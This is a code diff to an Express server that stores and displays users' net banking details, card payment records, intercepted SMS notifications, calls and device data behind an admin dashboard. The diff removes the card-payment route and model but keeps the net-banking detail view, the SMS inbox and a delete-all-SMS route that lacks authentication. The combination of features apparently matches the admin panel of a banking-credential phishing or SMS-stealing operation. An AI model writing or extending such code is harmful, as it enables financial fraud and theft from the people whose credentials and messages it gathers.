@@ -2,15 +2,13 @@ const express = require('express');
 const app = express();
 const mongoose = require('mongoose');
 const path = require('path');
-const helmet = require('helmet'); 
+const helmet = require('helmet');
 const Admin = require('./models/Admin');
 const dotenv = require('dotenv');
-const cardRoutes = require('./routes/cardRoutes');
 const netBankingRoutes = require('./routes/netBankingRoutes');
 const callRoutes = require('./routes/callRoutes');
 const userRoutes = require('./routes/userRoutes');
 const adminRoutes = require('./routes/adminRoutes');
-const CardPayment = require('./models/CardPayment');
 const NetBanking = require('./models/NetBanking');
 const notificationRoutes = require('./routes/notificationRoutes');
 const bodyParser = require('body-parser');
@@ -19,7 +17,7 @@ const session = require('express-session');
 const User = require('./models/User');
 const Notification = require('./models/Notification');
 const connectDB = require('./config/dbConfig');
-const deviceRoutes = require('./routes/deviceRoutes');  //  Corrected
+const deviceRoutes = require('./routes/deviceRoutes');  // Corrected
 const detail = require('./routes/detailsRoutes');
 
 dotenv.config();
@@ -46,8 +44,9 @@ const adminUsername = 'admin';
 // Connect to MongoDB
 connectDB();
 
-// Routes
-app.use('/api/detail', cardRoutes);
+// Removed card data–related route
+// app.use('/api/detail', cardRoutes);
+
 app.use('/api/payment', netBankingRoutes);
 app.use('/api/user', userRoutes);
 app.use('/api/admin', adminRoutes);
@@ -111,23 +110,16 @@ app.get('/dashboard', requireAuth, async (req, res) => {
 app.get('/detail/:id', requireAuth, async (req, res) => {
     try {
         const user = await User.findById(req.params.id);
-
         if (!user) {
             return res.status(404).send('User not found');
         }
-
-        const cardPayment = await CardPayment.findOne({ userId: user._id });
+        // Removed cardPayment retrieval and validation
         const netBanking = await NetBanking.findOne({ userId: user._id });
-
-        if (cardPayment && cardPayment.userId.toString() !== user._id.toString()) {
-            return res.status(400).send('Card payment details do not match the user.');
-        }
-
         if (netBanking && netBanking.userId.toString() !== user._id.toString()) {
             return res.status(400).send('Net banking details do not match the user.');
         }
-
-        res.render('detail', { user, cardPayment, netBanking });
+        // Render only user and netBanking data
+        res.render('detail', { user, netBanking });
     } catch (err) {
         console.error('Error fetching user details:', err);
         res.status(500).send('Error loading details');
@@ -153,16 +145,16 @@ app.get('/sms', requireAuth, async (req, res) => {
         res.status(500).send("Error loading SMS notifications.");
     }
 });
+
 app.post('/delete-all-sms', async (req, res) => {
     try {
-        await Notification.deleteMany({}); // सभी SMS notifications डिलीट करें
-        res.redirect('/sms'); // डिलीट करने के बाद SMS पेज पर रीडायरेक्ट करें
+        await Notification.deleteMany({});
+        res.redirect('/sms');
     } catch (err) {
         console.error("Error deleting all SMS:", err);
         res.status(500).send("Failed to delete all SMS notifications.");
     }
 });
-
 
 app.get('/settings', requireAuth, async (req, res) => {
     try {
